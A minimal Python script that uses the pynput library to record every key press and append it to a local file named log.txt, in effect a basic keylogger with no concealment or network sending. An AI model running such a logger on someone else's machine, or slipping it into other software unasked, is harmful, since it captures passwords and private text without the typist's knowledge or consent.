from pynput.keyboard import Listener

def log_keystroke(key):
    key = str(key).replace("'", "")  # Format key data
    with open("log.txt", "a") as log_file:
        log_file.write(key + "\n")

# Listen for key presses
with Listener(on_press=log_keystroke) as listener:
    listener.join()